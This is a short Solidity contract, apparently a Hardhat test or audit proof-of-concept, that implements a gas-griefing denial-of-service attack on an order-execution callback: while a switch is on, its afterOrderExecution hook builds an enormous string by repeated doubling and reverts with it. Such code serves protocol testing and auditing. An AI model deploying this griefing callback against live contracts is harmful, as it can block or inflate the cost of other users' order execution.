pragma solidity ^0.8.0;

import "../order/Order.sol";
import "hardhat/console.sol";

contract GasGriefingRevertContract {
    using Order for Order.Props;

    bool public DosAttack = true;

    function flipSwitch() public {
        DosAttack = false;
    }

    function afterOrderExecution(bytes32 key, Order.Props memory order) external {
        if(!DosAttack) return;

        string memory gas = "gasgasgasgasgagsgasgasgasgasgasgasgasgasgasgagsgasgasgasgasgasgasgasgasgasgagsgasgasgasgasgasgasgasgasgasgagsgasgasgasgasgasgasgasgasgasgagsgasgasgasgasgasgasgasgasgasgagsgasgasgasgasgasgasgas";

        for(uint i; i<10; i++) {
            gas = string.concat(gas, gas);
        }

        revert(gas);
    }
}
